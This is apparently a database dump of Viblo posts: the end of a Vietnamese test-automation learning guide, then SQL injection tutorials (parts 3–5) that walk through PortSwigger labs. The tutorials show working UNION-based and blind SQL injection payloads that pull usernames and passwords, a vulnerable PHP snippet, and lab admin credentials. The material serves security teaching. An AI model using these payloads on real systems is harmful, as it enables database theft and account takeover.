Từ đó sáng tạo trên chính testcase mà mình viết, làm chủ các step và tối ưu nó

Mình để hướng dẫn tại đây : https://bit.ly/3JFjgA
(Việc này mất khoảng 1-2h đối với 1,2 testcase đầu tiên bạn làm, 5-15 phút đối với các testcase tiếp theo mà bạn đã hiểu cách vận hành tool)

Nhớ học cách bắt locator trước để bắt được đúng chỗ mình cần (Tham khảo tại đây: https://bit.ly/3wAUMQX)

**3: Thử một mẫu hàm code có sẵn coppy về và phân tích từng đoạn một trước**

Đầu tiên bạn hãy thử dùng tính năng **Custom keyword có trong tool akaAT studio**

--> Ưu điểm của tool là bạn không phải cài đặt môi trường nhiều, cứ vậy code thử trước đã

Thử luôn bài list all link 1 website mà mình đã hướng dẫn trên tường nhà mình https://bit.ly/3HGUKgZ

Nhìn tổng quan nó làm những gì, đoạn này làm gì

Sau đó phân tích theo từng đoạn một Khai báo lớp (Class) chứa các hàm (hay còn gọi là method) mà mình định làm này, trong Class phải có các thuộc tính

Bạn đọc thêm ở đây mình thấy rất dễ hiểu nha (https://xuanthulab.net/lop-va-phuong-thuc-trong-java.html)

**4: Tập viết lại sau khi mình đã hiểu bản chất hàm mà mình đã tìm hiểu ở trên**
Viết lại, chạy lại, thử nghiệm lại.

**5: Tự code testcase auto mà mình đã hiểu các step trong đó làm gì, quen thuộc với mình**
Để làm được điều này, mỗi dòng code bạn phải hiểu rõ nó làm gì, các từ khóa mình viết ra nhiệm vụ là gì?
Để 1 keyword có thể reuse thì nó nên làm 1 nhiệm vụ độc lập Bạn hoàn toàn có thể kéo thả key word sau đó kéo thêm keyword mà mình đã code vào
Nhớ thêm chú thích mỗi đoạn mà mình làm có mục đích gì với cú pháp // nhé, để người sau nếu có reuse cũng hiểu mình làm cái gì ( bản free là bản cá nhân nha, sang trả phí mới kéo team vô dùng keyword mà mình đã tạo được không thì cứ coppy file về dùng cho nhau cũng được)
Nên debug để xem mình sai cái gì từng đoạn sửa cho dễ thay vì viết 1 loạt rồi mới debug ( cái này bản có phí thì debug được, bản free thì mình code chay rồi chạy rồi mới sửa)
Ví dụ: đang thử test đến cái đoạn login mình cứ phải login đi login lại các account để test thì mình làm cái keyword log in( làm hàm để log in )

**6: Hay được ngồi vs Dev thì hỏi nhiều vào**

Họ có thể chỉ bạn chỗ này bạn nên làm thế này tối ưu hơn

Hàm này nên tách nhỏ ra thay vì để gộp rối

Hay viết code đẹp hơn, dễ hiểu hơn
.....
CHÚ Ý:

Các từ khóa cần tìm hiểu trong quá trình CODE :

Đối tượng và lớp đối tượng

Tính kế thừa trong java, tính đa hình, tính đóng gói

Các câu lệnh if else, switch case, while, do while, try catch

Các thuật toán sắp xếp, thuật toán tìm kiếm..

Tới bước này mình tin khi bạn đăng ký học ở đâu, hay bạn tự tạo môi trường riêng cho mình cũng dễ dàng hơn rồi, có chủ đích hơn, nhanh hơn

Làm thử đi thì mới biết được mình làm được tới đâu nha,
Bạn làm tới bước nào rồi?
#akaat #akaATstudio #automationtesttool', '2023-02-06T06:30:57.000000Z', '2023-02-28T03:06:03.000000Z', '2023-02-06T08:37:03.000000Z'),
	('SQL injection vulnerabilities (Phần 5)', 'BQyJKjy94Me', '5', 'public', 'https://images.viblo.asia/370a17ed-d71b-432d-a0af-94137a2022ba.png', 'II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

5. Khai thác lỗ hổng SQL injection - Truy xuất dữ liệu trong các bảng (database tables) (tiếp)

5.3. Khai thác dữ liệu từ các bảng với cột hiển thị hạn chế

Từ các ví dụ trên chúng ta thấy lượng thông tin chúng ta cần khai thác thường gồm nhiều trường, và trên thực tế số lượng đó sẽ còn lớn hơn. Có thể một trường hợp xấu xảy ra, là số...', '## II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

### 5. Khai thác lỗ hổng SQL injection - Truy xuất dữ liệu trong các bảng (database tables) (tiếp)

#### 5.3. Khai thác dữ liệu từ các bảng với cột hiển thị hạn chế

Từ các ví dụ trên chúng ta thấy lượng thông tin chúng ta cần khai thác thường gồm nhiều trường, và trên thực tế số lượng đó sẽ còn lớn hơn. Có thể một trường hợp xấu xảy ra, là số cột dữ liệu tương thích với kiểu string hạn chế, hay nói cách khác là chúng ta chỉ có sử dụng lượng cột hiển thị dữ liệu nhỏ hơn số trường dữ liệu cần khai thác. Một cách tự nhiên, chúng ta có thể nghĩ tới cách khiến các dữ liệu cần khai thác hiển thị đồng thời trong cùng một cột - bằng cách nối chuỗi (ghép chuỗi).

Với mỗi hệ cơ sở dữ liệu khác nhau có các cú pháp nối chuỗi khác nhau, một số ví dụ:

|database management system|String concatenation syntax|
|-|-|
|Oracle|`''Vi''\|\|''blo''`|
|Microsoft|`''Vi''+''blo''`|
|PostgreSQL|`''Vi''\|\|''blo''`|
|MySQL|`''Vi'' ''blo''` hoặc `CONCAT(''Vi'',''blo'')`|

Kết quả từ các cú pháp nối chuỗi trên đều cho ra từ **Viblo**. Ngoài ra, để dữ liệu hiển thị được dễ dàng tìm kiếm, chúng ta có thể sử dụng các cú pháp nối chuỗi tương ứng nhằm phân tách các trường dữ liệu bằng các ký hiệu đặc biệt. Xét ví dụ payload khai thác trường **username** và **password** trong bảng **users**, hệ cơ sở dữ liệu **PostgreSQL** như sau:

**`'' UNION SELECT NULL, username || ''~'' || password FROM users--`**

Khi đó kết quả hiển thị theo dạng **`username~password`** như sau:

**`administrator~1qazSDmy6g32as`**
**`usertest~123456asd`**
**`guest~guest`**
...

#### Phân tích lab **[SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)**

![image.png](https://images.viblo.asia/1eac2517-8163-4932-adc4-61f9974a5cc3.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm truy xuất thông tin người dùng **administrator** trong bảng **users**, biết rằng bảng này chứa hai cột **username** và **password**.

Kiểm tra lỗ hổng **SQL injection** tại tham số **`category`**, payload **`/filter?category='' OR 1=1--`**

![image.png](https://images.viblo.asia/370a17ed-d71b-432d-a0af-94137a2022ba.png)

Kiểm tra số cột dữ liệu trả về của câu lệnh truy vấn. Payload: **`/filter?category=Pets'' UNION SELECT NULL, NULL--`**

![image.png](https://images.viblo.asia/74a98604-05f9-4eba-8eac-e21354cff4d4.png)

Như vậy câu lệnh truy vấn trả về $2$ cột dữ liệu. Tiếp theo tìm kiếm cột dữ liệu tương thích với kiểu string. Payload **`/filter?category='' UNION SELECT NULL, ''column2''--`** và **`/filter?category='' UNION SELECT ''column1'', NULL--`**. Ở đây chỉ có cột $2$ có thể lợi dụng để hiển thị thông tin khai thác:

![image.png](https://images.viblo.asia/156a1ba4-7789-4db4-aa35-09e094ce538f.png)

Do chúng ta đã biết tên bảng cần khai thác là **users** cũng với hai cột có tên là **username** và **password**, nên ta có kết hợp nối chuỗi để hiển thị đồng thời hai cột dữ liệu **username** và **password**. Payload: **`/filter?category='' UNION SELECT NULL, username || '':'' || password FROM users--`**

Câu truy vấn khi đó sẽ truy xuất thông tin từ hai cột **username**, **password** trong bảng **users** và hiển thị dữ liệu theo định dạng **`username:password`**, kết quả:

![image.png](https://images.viblo.asia/5cac6e98-1c05-4647-b9e0-dbad637e7180.png)

Đăng nhập với tài khoản **`administrator:kxdurl7kgn5rblp42i59`**, bài lab hoàn thành:

![image.png](https://images.viblo.asia/4b354100-c397-4a48-9fa3-7668677028af.png)

### 6. Blind SQL injection

#### 6.1. Sử dụng điều kiện logic khai thác lỗ hổng Blind SQL injection

Trong các trường hợp trên thì các dữ liệu truy xuất đều được hiển thị ra giao diện khiến kẻ tấn công có thể tận dụng lỗ hổng **SQL injection** nhằm truy xuất và đọc dữ liệu nhạy cảm. Vậy thì, khi câu truy vấn không còn hiển thị dữ liệu tới người dùng, lỗ hổng **SQL injection** có còn xảy ra không? Thật bất ngờ khi câu trả lời vẫn là có! Các lỗ hổng dạng này được gọi là **Blind SQL injection**. Có thể nhiều bạn có một thắc mắc: Kẻ tấn công không thể đọc được dữ liệu, thì kể cả payload tấn công có thực thi, dữ liệu được truy xuất, thì có tác dụng gì nhỉ? Thật thú vị khi trong trường hợp này, chúng ta vẫn có thể "đọc" được các thông tin nhạy cảm, tuy nhiên phương thức tấn công sẽ đặc biệt hơn!

![image.png](https://images.viblo.asia/c083f7f9-2a36-4b9d-b6a5-47a97a496acb.png)

Xem xét đoạn code **php** sau:

```php
<?php

if( isset( $_GET[ ''Submit'' ] ) ) {
    // Get input
    $id = $_GET[ ''id'' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = ''$id'';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed ''or die'' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The ''@'' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo ''<pre>User ID exists in the database.</pre>'';
    }
    else {
        // User wasn''t found, so the page wasn''t!
        header( $_SERVER[ ''SERVER_PROTOCOL'' ] . '' 404 Not Found'' );

        // Feedback for end user
        echo ''<pre>User ID is MISSING from the database.</pre>'';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

Tham số **`id`** có thể thay đổi tùy ý. Các trường dữ liệu được truy vấn **first_name**, **last_name** không được hiển thị ra giao diện, mà chỉ trả về các thông báo **User ID exists in the database** khi id người dùng tồn tại, **User ID is MISSING from the database** khi id người dùng không tồn tại.

![image.png](https://images.viblo.asia/21476a41-94b0-4af9-b3b1-084fb9e39438.png)

![image.png](https://images.viblo.asia/9255e8ad-2e69-4e9b-b903-63487d1d44e3.png)

Chính các dòng thông báo khác nhau này có thể giúp chúng ta "đọc" các dữ liệu nhạy cảm. Trước hết, xác định ký tự comment:

![image.png](https://images.viblo.asia/5bc8715b-542f-4460-87a4-3437dd1d9dd6.png)

![image.png](https://images.viblo.asia/3b3bef2f-0766-4cde-b129-71bf5c3c29e4.png)

Dấu comment hợp lệ là ký tự `#`. Phương pháp tấn công đặc biệt này dựa vào cơ sở các biểu thức logic:

![image.png](https://images.viblo.asia/72685d0b-358a-4c9c-af73-d0e5e6b573d0.png)

![image.png](https://images.viblo.asia/e98dd229-71bb-48fb-9ad0-846a2483b571.png)

Dựa vào thông báo trả về chúng ta có thể xác định biểu thức sau **and** là đúng hoặc sai. Vẫn hơi khó hình dung phải nhỉ, cùng xem input sau đây nhé:

![image.png](https://images.viblo.asia/c499e1f9-2b7d-494e-a4e1-659e2eacf766.png)

Biểu thức logic cũng có thể áp dụng đối với các ký tự, như vậy có thể sử dụng các cú pháp lệnh SQL trong một vế, kết hợp các ký tự cụ thể ở vế còn lại nhằm xác định kết quả truy vấn là đúng hay sai. Cùng xem xét một số câu lệnh thường sử dụng trong tấn công **Blind SQL injection** nhé:

- Length: độ dài

|database management system|Length syntax|
|-|-|
|Oracle|`LENGTH(string_expression)`|
|Microsoft|`LEN(string_expression)`|
|PostgreSQL|`LENGTH(string_expression)`|
|MySQL|`LENGTH(string_expression)`|

Các câu lệnh trên trả về độ dài **string_expression**, có thể sử dụng lệnh truy vấn trong các hàm **LENGTH**. Ví dụ trong khai thác **Blind SQL injection**:

![image.png](https://images.viblo.asia/f947f15f-62f1-46f7-860f-dacb566a458d.png)

![image.png](https://images.viblo.asia/1ec0569f-33a6-428c-8b9a-e067578330a0.png)

Như vậy chúng ta xác định được độ dài tên cơ sở dữ liệu gồm $4$ ký tự.

- Substring: lấy chuỗi con

|database management system|Substring syntax|
|-|-|
|Oracle|`SUBSTR(''Viblo'', 4, 2)`|
|Microsoft|`SUBSTRING(''Viblo'', 4, 2)`|
|PostgreSQL|`SUBSTRING(''Viblo'', 4, 2)`|
|MySQL|`SUBSTRING(''Viblo'', 4, 2)`|

Kết quả các câu lệnh trên đều trả về chuỗi **lo** nghĩa là lấy hai ký tự bắt đầu từ vị trí số $4$ (tính từ $1$). Có thể sử dụng lệnh truy vấn trong các hàm **SUBSTRING**. Ví dụ trong khai thác **Blind SQL injection**:

![image.png](https://images.viblo.asia/ac240abd-994c-4b3c-a8ec-4d3699e348b4.png)

![image.png](https://images.viblo.asia/e786ca34-e34a-4eab-9c92-b9d5049493a5.png)

Từ đây ta có thể xác định ký tự đầu tiên của tên cơ sở dữ liệu là **`d`**, tương tự như vậy chúng ta có thể xác định toàn bộ tên cơ sở dữ liệu, tên bảng, tên cột, các ký tự của dữ liệu.

Để hiểu rõ về phương pháp khai thác sử dụng các hàm **LENGTH()** và **SUBSTRING()**, chúng ta cùng phân tích kỹ hơn trong lab sau:

#### Phân tích lab **[Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)**

![image.png](https://images.viblo.asia/1dac129a-61e2-49a4-b2ee-c1c63e114512.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** dạng **Blind** khi phân tích và thực hiện truy vấn SQL bằng cookie theo dõi (tracking cookie), trong câu truy vấn có chứa giá trị của cookie đã gửi. Kết quả của lệnh truy vấn SQL không được hiển thị, tuy nhiên ứng dụng sẽ hiển thị thông báo **Welcome back!** trong giao diện nếu truy vấn trả về dữ liệu hợp lệ. Chúng ta cần khai thắc lỗ hổng nhằm tìm kiếm mật khẩu tài khoản **administrator**, biết rằng trong cơ sở dữ liệu chứa bảng **users**, gồm cột **username** và **password**.

Chúng ta đã biết trang web chứa lỗ hổng **Blind SQL injection** tại cookie **TrackingId**. Giả sử câu truy vấn trang web sử dụng có dạng như sau:

**`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ''3VdsB26Bc9ZSWws8''`**

Chúng ta có thể xác nhận lỗ hổng tồn tại bằng cách thêm biểu thức logic vào giá trị cookie **TrackingId**, payload:

![image.png](https://images.viblo.asia/554bda19-33e0-4589-856d-31d3f98d45a8.png)

![image.png](https://images.viblo.asia/03532a20-e5d8-4a01-b63c-ff0696780d77.png)

Khi câu truy vấn có logic đúng thì thông báo **Welcome back!** được hiển thị, như vậy chúng ta có thể chắc chặn tại cookie này chứa lỗ hổng **Blind SQL injection**.

Đề bài đã cho biết trang web chứa bảng **users**, kiểm tra sự tồn tại của bảng **users** như sau:

![image.png](https://images.viblo.asia/7181d676-f113-4af6-adc1-0f0edd08735b.png)

Với các thông tin được cho, chúng ta có câu lệnh truy vấn mật khẩu user **administrator** như sau:

**`SELECT password FROM users WHERE username=''administrator''`**

Kết hợp câu lệnh trên, chúng ta có thể tạo payload kiểm tra độ dài mật khẩu này như sau:

**`'' AND LENGTH(CAST((SELECT password FROM users WHERE username=''administrator'') AS varchar))=1--`**

Hàm **CAST()** có tác dụng chuyển kết quả lệnh truy vấn sang dạng **varchar**. Từ đây chúng ta xác định được độ dài mật khẩu này bằng $20$, sử dụng chức năng **Intruder** trong **Burp Suite**:

![image.png](https://images.viblo.asia/da7a3173-fe55-49ae-bca3-4d1b6be85ba1.png)

Cuối cùng, sử dụng hàm **SUBSTRING()** xây dựng payload xác định từng ký tự của mật khẩu như sau:

**`'' AND SUBSTRING((SELECT password FROM users WHERE username=''administrator''),1,1)=''a`**

Lần lượt xác định từng ký tự, cuối cùng chúng ta thu được password của **administrator** với $20$ ký tự và đăng nhập để hoàn thành bài lab:

![image.png](https://images.viblo.asia/09eff337-f170-4a7d-a104-3834afea6aac.png)', '2023-02-06T06:04:39.000000Z', '2023-02-24T10:54:01.000000Z', '2023-02-01T06:39:12.000000Z'),
	('SQL injection vulnerabilities (Phần 4)', 'm2vJPOZq4eK', '6', 'public', 'https://images.viblo.asia/dd2de1ee-f133-46e6-9ab7-89f894fb24f0.png', 'II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

5. Khai thác lỗ hổng SQL injection - Truy xuất dữ liệu trong các bảng (database tables) (tiếp)

5.2. Khai thác dữ liệu từ các bảng

Sau khi đã tìm được thông tin về loại hệ quản trị cơ sở dữ liệu được sử dụng cũng như kiểm tra các thông tin phụ như phiên bản hiện hành, chúng ta có thể sử dụng các cú pháp truy vấn tương ứng để khai thá...', '## II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

### 5. Khai thác lỗ hổng SQL injection - Truy xuất dữ liệu trong các bảng (database tables) (tiếp)

#### 5.2. Khai thác dữ liệu từ các bảng

Sau khi đã tìm được thông tin về loại hệ quản trị cơ sở dữ liệu được sử dụng cũng như kiểm tra các thông tin phụ như phiên bản hiện hành, chúng ta có thể sử dụng các cú pháp truy vấn tương ứng để khai thác dữ liệu mong muốn từ các bảng.

Đặt mục tiêu vào các cột **username** và **password** trong bảng **users** (giả sử đã biết trước các thông tin này), xét payload như sau:

**`'' UNION SELECT username, password FORM users--`**

Payload trên chắc hẳn các bạn đã rất quen thuộc do chúng ta đã phân tích khá kỹ ở các mục trên. Khi đó giao diện trả về kết quả gồm thông tin các cột dữ liệu cần khai thác. Để hiểu kỹ hơn về kỹ thuật này, chúng ta cùng xem xét bài lab sau:

#### Phân tích lab **[SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)**

![image.png](https://images.viblo.asia/70320367-cc15-44eb-a7c1-3d6bfea0e618.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm truy xuất thông tin người dùng **administrator** trong bảng **users**, biết rằng bảng này chứa hai cột **username** và **password**.

Kiểm tra lỗ hổng **SQL injection** tại tham số **`category`**, payload **`/filter?category=Pets'' OR 1=1--`**

![image.png](https://images.viblo.asia/dd2de1ee-f133-46e6-9ab7-89f894fb24f0.png)

Kiểm tra số cột dữ liệu trả về của câu lệnh truy vấn. Payload: **`/filter?category=Pets'' UNION SELECT NULL, NULL--`**

![image.png](https://images.viblo.asia/2e96b743-41b0-462b-a380-30068f36b09b.png)

Như vậy câu lệnh truy vấn trả về $2$ cột dữ liệu. Tiếp theo tìm kiếm cột dữ liệu tương thích với kiểu string. Payload **`/filter?category='' UNION SELECT ''column1'', ''column2''--`**

![image.png](https://images.viblo.asia/a90c349d-d27f-4f7b-9ea9-e9c942d0cf52.png)

Cả $2$ cột đều có thể tận dụng để hiển thị thông tin khai thác. Do chúng ta đã biết tên bảng cần khai thác là **users** cũng với hai cột có tên là **username** và **password**, thông tin người dùng cần khai thác có username là **administrator**, nên ta có thể xây dựng payload như sau:

**`/filter?category='' UNION SELECT password, NULL FROM users WHERE username = ''administrator''--`**

Câu truy vấn khi đó sẽ truy xuất thông tin mật khẩu từ cột **password** trong bảng **users** thỏa mãn điều tên username tương ứng là **administrator**, kết quả:

![image.png](https://images.viblo.asia/4e95a295-52ea-4997-8647-5f98d786c15c.png)

Đăng nhập với tài khoản **`administrator:ddryblwycrtpxdcku53g`**, bài lab hoàn thành:

![image.png](https://images.viblo.asia/8b55aba4-aff1-42db-88fb-f827b31b6551.png)

Tuy nhiên, có thể các bạn còn có một vài điều thắc mắc như: làm sao để mình có thể biết được các thông tin như, tên bảng, tên cột? Chúng ta hoàn toàn có cách để tìm ra những thông tin này, tuy nhiên phương pháp có phần khác biệt đối với từng hệ quản trị cơ sở dữ liệu.

Đối với hầu hết các hệ cơ sở dữ liệu (trừ **Oracle**) thì đều chứa một cơ sở dữ liệu thông tin là **INFORMATION_SCHEMA** - đã được tôi giới thiệu trong mục **Đặt vấn đề**. Có thể truy xuất thông tin tất cả các bảng với câu truy vấn sau:

**`SELECT * FROM information_schema.tables`**

Kết quả hiển thị có dạng như sau:

![image.png](https://images.viblo.asia/50fdb8f7-b74c-4ed8-ac6b-5c8dadbe7e96.png)

Như chúng ta thấy, thông tin tên các bảng được liệt kê trong cột **TABLE_NAME**. Như vậy, để có thể kết hợp phép **UNION** nhằm hiển thị danh sách tên các bảng trong cơ sở dữ liệu, chúng ta có thể "hợp" dữ liệu trong cột **TABLE_NAME** này vào câu truy vấn chứa lỗ hổng **SQL injection**. Payload có dạng như sau:

**`'' UNION SELECT NULL, table_name FROM information_schema.tables--`**

Sau khi có được danh sách tên bảng, chúng ta có thể truy xuất thông tin tất cả các cột từ một bảng cụ thể, chẳng hạn bảng **Users** với cú pháp như sau:

**`SELECT * FROM information_schema.columns WHERE table_name = ''Users''`**

Kết quả hiển thị có dạng như sau:

![image.png](https://images.viblo.asia/afdba128-7bec-4455-bc29-6519f46cb93b.png)

Thông tin các cột được hiển thị trong cột **COLUMN_NAME**. Do đó có thể kết hợp phép **UNION** nhằm hiển thị danh sách tên các cột trong bảng **Users** với payload như sau:

**`'' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = ''Users''--`**

#### Phân tích lab **[SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)**

![image.png](https://images.viblo.asia/c798d396-b198-4d9e-8934-05b20fc8347a.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm truy xuất thông tin đăng nhập từ tài khoản **administrator**, biết rằng trang web không sử dụng hệ quản trị cơ sở dữ liệu **Oracle**.

Kiểm tra lỗ hổng **SQL injection** tại tham số **`category`**, payload: **`/filter?category='' OR 1=1--`**

![image.png](https://images.viblo.asia/b7c33df3-c401-4c44-96ac-0375ea828baa.png)

Kiểm tra số cột dữ liệu trả về trong câu lệnh truy vấn, payload: **`/filter?category='' ORDER BY 2--`** không trả về error và **`/filter?category='' ORDER BY 3--`** trả về error:

![image.png](https://images.viblo.asia/59c2db54-302d-40ef-bd74-a75205904016.png)

![image.png](https://images.viblo.asia/13b8c5c5-1db1-4dcc-b100-cd93a04c6701.png)

Như vậy câu lệnh truy vấn trả về $2$ cột dữ liệu. Tìm kiểm cột dữ liệu tương thích với kiểu chuỗi, payload: **`/filter?category='' UNION SELECT ''column1'', ''column2''--`**

![image.png](https://images.viblo.asia/8df1752b-4afb-47a7-b0c1-d25f396de9dd.png)

Như vậy cả hai cột đều có thể tận dụng để hiển thị thông tin khai thác. Truy xuất tên các bảng, payload: **`/filter?category='' UNION SELECT table_name, NULL FROM information_schema.tables--`**

![image.png](https://images.viblo.asia/716fd49b-52e9-4c3e-9078-a5ce6becd60e.png)

Quan sát nhận thấy table **pg_user** có thể chứa thông tin tài khoản người dùng:

![image.png](https://images.viblo.asia/5b5c4d4c-789b-4154-b212-20d2418ec1f6.png)

Truy xuất tên các cột trong bảng **pg_user**, payload: **`/filter?category='' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = ''pg_user''--`**

![image.png](https://images.viblo.asia/9876a8df-43e8-4496-8238-bdc305ad31ba.png)

Trong bảng **pg_user** có chứa cột **usename** và **passwd** là cột chúng ta đang tìm kiếm. Truy xuất thông tin hai cột này, payload: **`/filter?category='' UNION SELECT usename || '':'' || passwd, NULL FROM pg_user--`**

![image.png](https://images.viblo.asia/0588f682-94c4-47b7-a12a-3fb2d48c857b.png)

Không tồn tại thông tin tài khoản chúng ta mong muốn, chú ý vào một table khác có tên **users_ctqofp**

![image.png](https://images.viblo.asia/94136616-1df7-4fa3-8592-087440c2d1c3.png)

Thực hiện lại các bước trên, truy xuất thông tin tên cột, payload: **`/filter?category='' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = ''users_ctqofp''--`**

![image.png](https://images.viblo.asia/4127d972-4696-457a-bb9c-254850caa950.png)

Truy xuất thông tin tài khoản **administrator**, payload: **`/filter?category='' UNION SELECT username_tgvxoo || '':'' || password_wmrodb, NULL FROM users_ctqofp--`**

![image.png](https://images.viblo.asia/f4aba04a-2ea6-46c7-84a2-32f4dce2a8d0.png)

Đăng nhập với tài khoản **`administrator:3utqzp4omabpvutbnz2u`**, bài lab được giải quyết:

![image.png](https://images.viblo.asia/73d2d4e8-66fc-4b99-8b71-6e01586e2b08.png)

Đối với hệ quản trị cơ sở dữ liệu **Oracle**:

- **DUAL**: là bảng một hàng đặc biệt được hiển thị theo mặc định trong tất cả các cài đặt cơ sở dữ liệu của Oracle

![image.png](https://images.viblo.asia/be4bb160-64f2-4ffc-afdf-8a6cd59b6325.png)

- **ALL_TABLES**: trả về thông tin các bảng người dùng hiện tại có thể truy cập.
- **ALL_TAB_COLUMNS**: trả về thông tin các cột của bảng

Trong **ALL_TABLES** có chứa các cột như **TABLE_NAME**, **OWNER**, ... Xét câu truy vấn sau:

**`SELECT TABLE_NAME, OWNER, TABLESPACE_NAME FROM all_tables`**

![image.png](https://images.viblo.asia/52cf041e-9a46-4993-8c3d-06b3ea0bfbaf.png)

Từ đây có payload kết hợp phép **UNION** trả về danh sách tên các bảng:

**`'' UNION SELECT NULL, table_name FROM all_tables--`**

Tương tự, chúng ta có payload kết hợp phép **UNION** trả về danh sách tên các cột:

**`'' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = ''Users''--`**

#### Phân tích lab **[SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)**

![image.png](https://images.viblo.asia/313a0467-45a4-47bb-b4a8-d7d5a1da2253.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm truy xuất thông tin đăng nhập từ tài khoản **administrator**, biết rằng trang web sử dụng hệ quản trị cơ sở dữ liệu **Oracle**.

Kiểm tra lỗ hổng **SQL injection** tại tham số **`category`**, payload: **`/filter?category='' OR 1=1--`**

![image.png](https://images.viblo.asia/9d1760d0-7ea7-4a62-a419-ea3d92be805c.png)

Dữ liệu hiển thị bao gồm tất cả các thể loại. Tiếp theo, kiểm tra số cột dữ liệu trả về trong câu truy vấn, payload **`/filter?category='' UNION SELECT NULL, NULL FROM dual--`**

![image.png](https://images.viblo.asia/ab1772f6-31bc-43b5-9e1f-da0d55f583af.png)

Như vậy câu lệnh truy vấn trả về $2$ cột dữ liệu. Tìm kiểm cột dữ liệu tương thích với kiểu chuỗi, payload: **`/filter?category='' UNION SELECT ''column1'', ''column2'' FROM dual--`**

![image.png](https://images.viblo.asia/1999269c-1c42-4f3e-8602-ab836d24aa3d.png)

Cả hai cột đều có thể sử dụng để hiển thị thông tin khai thác. Truy xuất tên các bảng, payload: **`/filter?category='' UNION SELECT table_name, NULL FROM all_tables--`**

![image.png](https://images.viblo.asia/32a654a4-074d-4d8d-9c65-a0cba654ba7d.png)

Quan sát nhận thấy table **USERS_RRFPZC** có thể chứa thông tin tài khoản người dùng:

![image.png](https://images.viblo.asia/c17efb19-6936-48fc-b9bf-5825518c92a1.png)

Truy xuất tên các cột trong bảng **USERS_RRFPZC**, payload: **`/filter?category='' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = ''USERS_RRFPZC''--`**

![image.png](https://images.viblo.asia/8621e7b8-8dd6-4e68-b95f-ac17a79ff5f3.png)

Truy xuất thông tin tài khoản **administrator**, payload: **`/filter?category='' UNION SELECT PASSWORD_UFSEWS, NULL FROM USERS_RRFPZC WHERE USERNAME_HQUIIX = ''administrator''--`**

![image.png](https://images.viblo.asia/5a5b9d27-0f34-4630-9a3c-cf1e0e675081.png)

Đăng nhập với tài khoản **administrator:1t3b78kq9q64oo4ftw6k**, bài lab hoàn thành:

![image.png](https://images.viblo.asia/870922d4-9b9b-4f41-8ecc-e50f51e54835.png)', '2023-02-06T06:04:33.000000Z', '2023-02-28T04:15:07.000000Z', '2023-02-01T06:37:09.000000Z'),
	('SQL injection vulnerabilities (Phần 3)', 'yZjJYzAXLOE', '7', 'public', 'https://images.viblo.asia/2746cd80-7b86-4031-b36a-e5b429a77ead.png', 'II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

4. Khai thác lỗ hổng SQL injection - Thu thập thông tin câu truy vấn (tiếp)

4.2. Xác định cột dữ liệu tương thích với kiểu dữ liệu cần truy xuất

Sau khi xác định được số cột dữ liệu trả về, chúng ta cần tiếp tục tìm kiểm cột dữ liệu có thể được khai thác để hiển thị (trả về) kết quả thông tin truy xuất cụ thể. Thông thường kiểu dữ l...', '## II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

### 4. Khai thác lỗ hổng SQL injection - Thu thập thông tin câu truy vấn (tiếp)

#### 4.2. Xác định cột dữ liệu tương thích với kiểu dữ liệu cần truy xuất

Sau khi xác định được số cột dữ liệu trả về, chúng ta cần tiếp tục tìm kiểm cột dữ liệu có thể được khai thác để hiển thị (trả về) kết quả thông tin truy xuất cụ thể. Thông thường kiểu dữ liệu thông tin cần khai thác là string nên chúng ta có thể thực hiện thử lần lượt từng cột như sau:

**`SELECT name, description FROM products WHERE category = ''gift'' UNION SELECT ''column1'', NULL--''`**

**`SELECT name, description FROM products WHERE category = ''gift'' UNION SELECT NULL, ''column2''--''`**

Sau đó tìm kiếm trong giao diện phản hồi các từ khóa **column1**, **column2**, sự xuất của từ khóa cũng tương ứng với cột dữ liệu có thể khai thác kiểu chuỗi. Để dễ dạng tìm kiếm các từ khóa đặc biệt này, chúng ta nên để tham số **`category`** nhận giá trị rỗng để loại bỏ các thông tin dư thừa, ví dụ payload:

**`'' UNION SELECT ''column1'', NULL--`**

#### Phân tích lab **[SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)**

